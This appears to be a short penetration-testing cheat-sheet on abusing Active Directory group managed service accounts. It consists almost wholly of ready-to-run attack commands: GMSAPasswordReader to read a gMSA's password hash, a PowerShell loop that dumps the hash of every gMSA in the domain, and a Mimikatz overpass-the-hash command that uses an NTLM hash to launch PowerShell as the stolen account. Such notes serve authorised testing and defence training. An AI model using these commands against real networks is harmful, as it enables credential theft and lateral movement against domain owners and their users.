### Using the [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader) tool. 
#### Executing GMSAPasswordReader
```cmd
GMSAPasswordReader.exe --accountname <ACCOUNT-NAME>
```
<img width="1609" height="486" alt="Pasted image 20251229191757" src="https://github.com/user-attachments/assets/6f8c66a5-66c9-48d7-b36f-87153ea99b66" />

#### You enumerate all gMSA accounts first, then loop over them:
```powershell
Get-ADServiceAccount -Filter * | ForEach-Object {
    .\GMSAPasswordReader.exe --accountname $_.Name
}
```
#### Using `Mimikatz` to perform `OverPass-the-Hash`:
```cmd
mimikatz.exe privilege::debug "sekurlsa::pth /user:<ACCOUNT-NAME> /domain:domain.local /ntlm:69978088B44350772FEBDB1E3DAC6F39 /run:powershell.exe" exit
```

